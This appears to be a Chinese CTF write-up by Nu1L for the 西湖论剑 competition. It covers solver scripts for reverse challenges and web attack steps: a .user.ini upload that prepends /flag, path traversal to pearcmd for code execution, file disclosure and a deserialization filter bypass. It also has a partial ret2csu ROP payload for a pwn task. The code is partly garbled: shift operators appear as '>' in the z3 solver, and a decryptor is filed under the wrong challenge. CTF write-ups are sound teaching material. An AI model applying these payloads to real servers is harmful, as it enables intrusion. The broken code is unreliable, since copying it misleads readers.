⻄湖论剑 WriteUp By Nu1L
⻄湖论剑 WriteUp By Nu1L
Reverse
ROR
TacticalArmed
Web
EZupload
OA?RCE?
灏妹的web
EasyTp
Pwn
Blind
string_go
easykernel
Misc
签到
Crypto
unknown_dsa
FilterRandom
SpecialCurve2
hardrsa
密码⼈集合
Reverse
ROR
from z3 import *
des = [  0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB, 
  0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39, 
  0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39, 
  0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79]
s_box = [  0x65, 0x08, 0xF7, 0x12, 0xBC, 0xC3, 0xCF, 0xB8, 0x83, 0x7B, 
  0x02, 0xD5, 0x34, 0xBD, 0x9F, 0x33, 0x77, 0x76, 0xD4, 0xD7, 
  0xEB, 0x90, 0x89, 0x5E, 0x54, 0x01, 0x7D, 0xF4, 0x11, 0xFF, 
  0x99, 0x49, 0xAD, 0x57, 0x46, 0x67, 0x2A, 0x9D, 0x7F, 0xD2, 
  0xE1, 0x21, 0x8B, 0x1D, 0x5A, 0x91, 0x38, 0x94, 0xF9, 0x0C, 
  0x00, 0xCA, 0xE8, 0xCB, 0x5F, 0x19, 0xF6, 0xF0, 0x3C, 0xDE, 
  0xDA, 0xEA, 0x9C, 0x14, 0x75, 0xA4, 0x0D, 0x25, 0x58, 0xFC, 
  0x44, 0x86, 0x05, 0x6B, 0x43, 0x9A, 0x6D, 0xD1, 0x63, 0x98, 
  0x68, 0x2D, 0x52, 0x3D, 0xDD, 0x88, 0xD6, 0xD0, 0xA2, 0xED, 
  0xA5, 0x3B, 0x45, 0x3E, 0xF2, 0x22, 0x06, 0xF3, 0x1A, 0xA8, 
  0x09, 0xDC, 0x7C, 0x4B, 0x5C, 0x1E, 0xA1, 0xB0, 0x71, 0x04, 
  0xE2, 0x9B, 0xB7, 0x10, 0x4E, 0x16, 0x23, 0x82, 0x56, 0xD8, 
  0x61, 0xB4, 0x24, 0x7E, 0x87, 0xF8, 0x0A, 0x13, 0xE3, 0xE4, 
  0xE6, 0x1C, 0x35, 0x2C, 0xB1, 0xEC, 0x93, 0x66, 0x03, 0xA9, 
  0x95, 0xBB, 0xD3, 0x51, 0x39, 0xE7, 0xC9, 0xCE, 0x29, 0x72, 
  0x47, 0x6C, 0x70, 0x15, 0xDF, 0xD9, 0x17, 0x74, 0x3F, 0x62, 
  0xCD, 0x41, 0x07, 0x73, 0x53, 0x85, 0x31, 0x8A, 0x30, 0xAA, 
  0xAC, 0x2E, 0xA3, 0x50, 0x7A, 0xB5, 0x8E, 0x69, 0x1F, 0x6A, 
  0x97, 0x55, 0x3A, 0xB2, 0x59, 0xAB, 0xE0, 0x28, 0xC0, 0xB3, 
  0xBE, 0xCC, 0xC6, 0x2B, 0x5B, 0x92, 0xEE, 0x60, 0x20, 0x84, 
  0x4D, 0x0F, 0x26, 0x4A, 0x48, 0x0B, 0x36, 0x80, 0x5D, 0x6F, 
  0x4C, 0xB9, 0x81, 0x96, 0x32, 0xFD, 0x40, 0x8D, 0x27, 0xC1, 
  0x78, 0x4F, 0x79, 0xC8, 0x0E, 0x8C, 0xE5, 0x9E, 0xAE, 0xBF, 
  0xEF, 0x42, 0xC5, 0xAF, 0xA0, 0xC2, 0xFA, 0xC7, 0xB6, 0xDB, 
  0x18, 0xC4, 0xA6, 0xFE, 0xE9, 0xF5, 0x6E, 0x64, 0x2F, 0xF1, 
  0x1B, 0xFB, 0xBA, 0xA7, 0x37, 0x8F]
de1 = []
for i in des:
    de1.append(s_box.index(i))
flags = []
for i in range(40):
    flags.append(BitVec(f'flag{i}',8))
so = Solver()
v6 = [0] * 8
v6[0] = 128
v6[1] = 64
v6[2] = 32
v6[3] = 16
v6[4] = 8
v6[5] = 4
v6[6] = 2
v6[7] = 1
for i in range(0,40,8):
    for j in range(8):
        v5 = ((v6[j] & flags[i + 3]) > 
((3 - j) % 8)) | ((v6[j] & flags[i + 2]) > ((2 - j) % 8)) | ((v6[j] & flags[i + 1]) > ((1 - j) % 8)) | ((v6[j] & flags[i]) > (-j % 8))
        tmp = (((v6[j] & flags[i + 7]) > ((7 - j) % 8)) | ((v6[j] & flags[i + 6]) > ((6 - j) % 8)) | ((v6[j] & flags[i + 5]) > ((5 - j) % 8)) | ((v6[j] & flags[i + 4]) > ((4 - j) % 8)) | v5)
        so.add(tmp == de1[i+j])
print(so.check())
m = so.model()
print(''.join(chr(m[i].as_long()) for i in flags))
TacticalArmed
恢复指令：
发现是个tea，动态调试获取key，写出逆即可
import ida_bytes
import struct
des = 0x8000000
ins_addr = 0x405010
sizes_addr = 0x405220
def get_patch_addr(a2,a3):
    t = ida_bytes.get_dword(0x4052A8 + a2 * 4)
    v5 = t % 0x10
    v4 = t >> 4
    if v4 == 1:
        return 4 * (v5 + 2 * a3) + 0x405648
    if v4 == 2:
        return  4 * v5 + 0x405000
    if v4 == 3:
        return 0x405748
def patch_addr(ori,addr):
    if addr is None:return ori
    for i in range(len(ori)):
        if ori[i] == 0:
            return ori[:i] + struct.pack('I',addr)+ ori[i+4:]
    return ori
size = ida_bytes.get_dword(sizes_addr)
v14 = 0
while size != 0:
    ins = ida_bytes.get_bytes(ins_addr,size)
    pa = get_patch_addr(v14,0)
    res = patch_addr(ins,pa)
    ida_bytes.patch_bytes(des,res)
    des += len(res)
    sizes_addr += 4
    size = ida_bytes.get_dword(sizes_addr)
    v14 += 1
    ins_addr += 16
Web
EZupload
模板在编译时会在tempdir⽬录中产⽣编译后的缓存⽂件，⽽⽂件上传并没有过滤 .user.ini ，所以我们可以上传
⼀个.user.ini⽂件，内容是 auto_prepend_file=/flag ，然后编译缓存的⽂件名是由模板名和⼀个hash组成的，
hash是getTemplateClass函数⽣成的
from pwn import * 
import fuckpy3
def dec(a1,a2,fuck_s = 0):
    s = 0x81A5692E * 33 * (fuck_s + 1)
    s %= 0x100000000
    for i in range(33):
        a2 -= ((16 * a1 + 0x66398867) ^ (a1 + s) ^ ((a1 >> 5) + 0xc35195b1))
        a2 %= 0x100000000
        a1 -= ((16 * a2 + 0x7ce45630) ^ (a2 + s) ^ ((a2 >> 5) +  0x58334908))
        a1 %= 0x100000000
        s -= 0x81A5692E
        s %= 0x100000000
    return (p32(a1) + p32(a2)).str()
en = [0x422F1DED, 0x1485E472, 0x35578D5, 0x0BF6B80A2, 0x97D77245,
0x2DAE75D1, 0x665FA963, 0x292E6D74, 0x9795FCC1, 0x0BB5C8E9]
res = ''
for i in range(0,10,2):
    res += dec(en[i],en[i+1],i//2)
print(res)
public function getTemplateClass(string $name): string
  {
    $key = serialize([$this->getLoader()->getUniqueId($name), self::VERSION, 
array_keys((array) $this->functions), $this->sandboxed]);
    return 'Template' . substr(md5($key), 0, 10);
  }
在这个函数中，除了版本之外的变量都是固定的。我们可以在 ./vendor/composer/installed.json 找到latte的
版本，进⽽直接算出hash。然后访问编译缓存⽂件，auto_prepend_file⽣效，读出flag。
OA?RCE?
⽤这个OA换表的base64编码⼀下路径： echo $this->jm-
>base64encode("../../../../../../../../../../usr/local/lib/php/pearcmd");
灏妹的web
.idea/dataSources.xml
EasyTp
控制器代码： /public/?file=aaaaaa/../../../../../var/www/html/app/controller/Index.php
pop链随便⽹上找⼀条即可： https://xz.aliyun.com/t/9310#toc-6
⽤三个斜杆绕过过滤 ///public/index.php/Index/unser
Pwn
Blind
from pwn import *
elf = ELF("./blind")
def csu(func,rdi,rsi,rdx):
    payload = p64(0x4007BA)
    payload += p64(0)+p64(1)+p64(func)+p64(rdx)+p64(rsi)+p64(rdi)+p64(0x4007a0)
    payload += b'A'*56
    return payload
read_got = elf.got['read']
alarm_got = elf.got['alarm']
# s = process("./blind")
# for i in range(0x100):
#     try: